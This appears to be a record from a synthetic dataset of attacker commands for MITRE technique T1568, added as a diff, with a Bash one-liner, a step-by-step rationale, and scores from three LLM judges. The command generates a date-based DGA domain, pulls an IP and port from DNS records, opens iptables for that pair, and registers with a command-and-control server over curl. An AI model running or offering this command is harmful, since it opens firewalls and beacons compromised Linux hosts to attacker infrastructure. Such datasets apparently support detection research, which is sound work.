@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'd=$(date -u +%m%d%H | sha1sum | cut -c1-8).edge-hub.net; ip=$(dig +short A \"$d\" | head -n1); port=$(dig +short TXT _p.$d | tr -d \"\\\"\" | grep -Eo \"p=[0-9]{2,5}\" | cut -d= -f2); if [ -n \"$ip\" ] && [ -n \"$port\" ]; then iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$d:$port/register?ts=$(date +%s)\"; fi'",
+  "explanation": "Uses TXT records to retrieve a dynamic port while resolving the DGA domain to an IP. Opens iptables for that IP:port pair and then registers with the C2.",
+  "rationale_steps": [
+    "Generate an hourly DGA domain",
+    "Resolve A record to determine the current IP",
+    "Read TXT record to extract dynamic port value",
+    "Apply iptables rules for the discovered IP:port",
+    "Send C2 registration request using curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-e8da1adc",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for all the bash, date, dig, iptables, and curl components.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Dynamic Resolution technique by using a date-based domain generation algorithm to create a domain name, retrieving IP and port information via DNS lookups, and establishing communication with the command and control server.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:23:30.063278Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats, and correct command substitutions throughout the complex string.",
+        "semantic_score": 3,
+        "semantic_justification": "While the DGA generation and dynamic resolution of both IP (A record) and port (TXT record) are perfectly aligned with T1568, the `iptables` commands require root privileges, which contradict the stated 'Privilege: None,' making the command unable to achieve its claimed intent of opening the firewall and establishing C2.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:23:48.892043Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash one-liner with balanced quoting, valid pipelines, and correct flags for dig, iptables, grep, cut, and curl.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-based domain generation and TXT-based dynamic port resolution consistent with T1568 and attempts C2 registration, but iptables rule insertion will typically fail without elevated privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:24:02.847316Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
